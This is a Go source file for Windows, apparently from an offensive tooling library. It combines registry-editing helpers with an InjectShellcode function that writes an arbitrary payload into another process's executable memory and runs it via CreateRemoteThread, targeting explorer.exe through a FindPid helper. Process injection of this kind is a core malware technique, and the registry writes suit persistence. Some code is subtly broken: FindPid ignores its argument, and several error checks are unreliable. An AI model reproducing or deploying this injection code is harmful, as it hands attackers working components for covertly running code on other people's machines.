// +build windows

package windows

import (
	"errors"
	"syscall"
	"unsafe"

	"github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows/registry"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	// registry globals
	regKeys = map[string]registry.Key{
		"CLASSES_ROOT":     registry.CLASSES_ROOT,
		"CURRENT_USER":     registry.CURRENT_USER,
		"LOCAL_MACHINE":    registry.LOCAL_MACHINE,
		"USERS":            registry.USERS,
		"CURRENT_CONFIG":   registry.CURRENT_CONFIG,
		"PERFORMANCE_DATA": registry.PERFORMANCE_DATA,
	}
)

type RegistryRetValue struct {
	ValType        string   `json:"return_type"`
	StringVal      string   `json:"string_val"`
	StringArrayVal []string `json:"string_array_val"`
	ByteArrayVal   []byte   `json:"byte_array_val"`
	IntVal         uint32   `json:"int_val"`
	LongVal        uint64   `json:"long_val"`
}

// registry funcs
func lookUpKey(keyString string) (registry.Key, error) {
	key, ok := regKeys[keyString]
	if !ok {
		// lol, picking a key at random because fuck golang return types
		return registry.CLASSES_ROOT, errors.New("Registry key " + keyString + " not found")
	}
	return key, nil
}

func AddRegKeyString(registryString string, path string, name string, value string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetStringValue(name, value)
}

func AddRegKeyExpandedString(registryString string, path string, name string, value string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetExpandStringValue(name, value)
}

func AddRegKeyBinary(registryString string, path string, name string, value []byte) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetBinaryValue(name, value)
}

func AddRegKeyDWORD(registryString string, path string, name string, value uint32) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetDWordValue(name, value)
}

func AddRegKeyQWORD(registryString string, path string, name string, value uint64) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetQWordValue(name, value)
}

func AddRegKeyStrings(registryString string, path string, name string, value []string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetStringsValue(name, value)
}

func DelRegKey(registryString string, path string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	return registry.DeleteKey(regKey, path)
}

func DelRegKeyValue(registryString string, path string, valueName string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	regKey.DeleteValue(path)
	return registry.DeleteKey(regKey, path)
}

func QueryRegKey(registryString string, path string, key string) (RegistryRetValue, error) {
	retVal := RegistryRetValue{}
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return retVal, err
	}
	openRegKey, err := registry.OpenKey(regKey, path, registry.QUERY_VALUE)
	if err != nil {
		return retVal, err
	}
	_, valType, err := openRegKey.GetValue(key, nil)
	if err != nil {
		return retVal, err
	}
	switch valType {
	case registry.EXPAND_SZ:
		value, _, err := openRegKey.GetStringsValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "StringArray"
		retVal.StringArrayVal = value
	case registry.SZ:
		value, _, err := openRegKey.GetStringValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "String"
		retVal.StringVal = value
	case registry.BINARY:
		value, _, err := openRegKey.GetBinaryValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "ByteArray"
		retVal.ByteArrayVal = value
	case registry.DWORD:
		value, _, err := openRegKey.GetIntegerValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "Uint"
		retVal.IntVal = uint32(value)
	case registry.QWORD:
		value, _, err := openRegKey.GetIntegerValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "Uint64"
		retVal.LongVal = value
	}
	return retVal, nil
}

func FindPid(procName string) (int, error) {
	procs, err := ps.Processes()
	if err != nil {
		return 0, err
	}
	for _, proc := range procs {
		if proc.Executable() == "explorer.exe" {
			return proc.Pid(), nil
		}
	}
	return 0, errors.New("explorer.exe PID not found!")
}

func InjectShellcode(pid int, payload []byte) error {
	// init
	kernel, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return err
	}
	openProc, err := kernel.FindProc("OpenProcess")
	if err != nil {
		return err
	}
	writeProc, err := kernel.FindProc("WriteProcessMemory")
	if err != nil {
		return err
	}
	allocExMem, err := kernel.FindProc("VirtualAllocEx")
	if err != nil {
		return err
	}
	createThread, err := kernel.FindProc("CreateRemoteThread")
	if err != nil {
		return err
	}

	// open remote process
	remoteProc, _, err := openProc.Call(
		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
		uintptr(0),
		uintptr(pid),
	)
	if err != nil {
		return err
	}

	// allocate memory in remote process
	remoteMem, _, err := allocExMem.Call(
		remoteProc,
		uintptr(0),
		uintptr(len(payload)),
		MEM_RESERVE|MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return err
	}

	// write shellcode to the allocated memory within the remote process
	writeProc.Call(
		remoteProc,
		remoteMem,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(0),
	)

	// GO!
	status, _, _ := createThread.Call(
		remoteProc,
		uintptr(0),
		0,
		remoteMem,
		uintptr(0),
		0,
		uintptr(0),
	)
	if status == 0 {
		return errors.New("could not inject into given process")
	}

	// all good!
	return nil
}
